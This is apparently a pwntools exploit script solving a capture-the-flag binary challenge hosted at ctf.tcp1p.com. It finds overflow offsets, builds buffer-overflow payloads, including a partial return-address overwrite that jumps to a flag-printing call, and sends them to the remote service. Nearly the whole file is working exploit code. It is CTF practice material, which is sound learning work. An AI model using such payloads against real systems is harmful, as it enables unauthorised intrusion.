from pwn import *

NC = "nc ctf.tcp1p.com 50283"
HOST = NC.split(" ")[1]
PORT = NC.split(" ")[2]

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *vuln+97
b *flag
"""
gdbscript.format(**locals())

# Binary filename
# exe = "./baby_pwn_1"
exe = "./src/chall"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# # 1
# offset = 8

# # Start program
# io = start()

# # Build the payload
# payload = flat({offset: [0x1]})

# # Send the payload
# io.sendlineafter(b"What is your name?", payload)

# # Got Shell?
# io.interactive()

# # 2
# offset = 40

# # Start program
# io = start()

# # Build the payload
# payload = flat({offset: [0x004012F2]})

# # Send the payload
# io.sendlineafter(b"What is your name?", payload)

# # Got Shell?
# io.interactive()

# 3
# offset = 178

# 4
offset = 108

# Start program
io = start()

# Build the payload
padding = b"A"*offset
payload = padding
payload += p8(142)  # index byte terakhir dari return address
# byte terakhir dari fungsi main+23 = call flag
payload += p8((elf.sym['main']+23) & 0xff)

# Send the payload
# io.sendlineafter(b"name?", payload)
io.sendline(payload)

# Got Shell?
io.interactive()
